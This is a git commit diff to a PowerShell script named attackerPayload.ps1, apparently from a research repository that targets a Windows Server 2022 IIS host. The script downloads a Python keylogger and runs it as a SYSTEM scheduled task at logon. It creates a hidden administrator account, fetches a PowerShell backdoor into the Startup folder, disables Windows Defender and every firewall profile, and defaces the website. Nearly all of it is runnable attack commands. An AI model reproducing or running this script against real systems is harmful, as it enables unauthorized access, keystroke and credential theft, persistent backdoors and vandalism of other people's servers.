25e8584b1c5fe8c93347988207bf38b9d0e999cf
cleverbear57 <84736210+cleverbear57@users.noreply.github.com>
2026-03-26 19:13:30 -0700

    Update attackerPayload.ps1

--- Windows Server 2022 IIS/attackerPayload.ps1
+++ Windows Server 2022 IIS/attackerPayload.ps1
@@ -1,10 +1,21 @@
-# add malicious user
-net user hackerman "password" /add
-Add-LocalGroupMember -Group "Administrators" -Member "hackerman"
 
-# download nc backdoor to startup folder
-curl "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\nc.exe"
-curl “https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%2010%20Workstation/script.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\script.exe"
+# install python and python keylogger
+Invoke-WebRequest https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe -OutFile python-installer.exe
+Start-Process python-installer.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+pip install pynput
+curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%20Server%202022%20IIS/klogger.py" -OutFile "C:/Windows/System32/config/klogger.pyw"
+Register-ScheduledTask -TaskName "PyBgTask" `
+-Action (New-ScheduledTaskAction -Execute "C:\Program Files\Python312\pythonw.exe" -Argument "C:\Windows\System32\config\klogger.pyw") `
+-Trigger (New-ScheduledTaskTrigger -AtLogOn) `
+-Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) `
+-Force
+
+# add malicious user
+net user john "password" /add
+Add-LocalGroupMember -Group "Administrators" -Member "john"
+
+# download powershell backdoor to startup folder
+curl "https://raw.githubusercontent.com/cleverbear57/AI-Research-Project/refs/heads/main/Windows%20Server%202022%20IIS/shl.ps1" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shl.ps1"
 
 # disable windows defender and real-time protection
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
@@ -15,5 +26,9 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-
 # disable all firewall profiles
 Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
 
-# deface the website
-echo "YOU HAVE BEEN HACKED HEEHEHEHEHEHE" > C:/inetpub/wwwroot/index.php
+# install silver beacon
+
+# deface website
+echo "YOU HAVE BEEN HACKED!!!" > "C:\inetpub\wwwroot\index.php"
+
+
